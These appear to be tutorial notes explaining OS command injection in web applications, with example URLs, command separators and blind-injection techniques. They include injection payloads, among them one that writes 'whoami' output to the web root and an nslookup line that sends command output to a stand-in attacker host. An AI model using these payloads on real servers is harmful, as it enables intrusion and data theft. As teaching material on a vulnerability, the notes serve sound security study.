### What is an  OS command injection ?

It is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running the application, typically compromise the application and all its data.

### Executing arbitrary commands - 

Consider a web shop that lets user view the details of a product through the following URL - 

```html
https://insecure-website.com/productDetails?pid=29
```

The application might be using this `pid` value to get the results. For this, there might be a shell command to which this `pid` value is being supplied to.

```shell
$ getprodDetails 29
```

If the `pid` value is not sanitised correctly, it might give rise to `OS command injection`. The attacker can exploit this through the following URL - 

```html
https://insecure-website.com/productDetails?pid=& echo Hello & 29
```

The shell command will be - 

```shell
$ getprodDetails & echo Hello & 29
```

The server will now execute 3 commands - 

```shell
$ getprodDetails
```

```shell
$ echo Hello
```

```shell
$ 29
```

The output of the commands will be - 

```shell
ERROR: pid not given
Hello
29: command not found
```

The attacker is able to run `echo Hello` on the server.

### Blind command injection vulnerabilities - 

Many instances of OS command injection are blind vulnerabilities. 

This means that the application does not return the output from the command within its HTTP response. 

Blind vulnerabilities can still be exploited, but different techniques are required.

- **Detecting blind command injection using time delays** - You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond.
- **Exploiting blind command injection by redirecting output** - You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser. Example - `& whoami > /var/www/static/whoami.txt &`
- **Exploiting blind command injection using out-of-band (OAST) techniques** - You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. Example - `& nslookup kgji2ohoyw.web-attacker.com &`. The out-of-band channel also provides an easy way to exfiltrate the output from injected commands - `& nslookup [backtick]whoami[backtick].kgji2ohoyw.web-attacker.com &`.

### Ways of injecting OS commands - 

- The following command separators work on both Windows and Unix-based systems: `&, &&, |, ||`.
- The following command separators work only on Unix-based systems: `;, 0x0a,\n`.
- On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command: 
	- \`injected command\`.
	- $(injected command)
- Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.

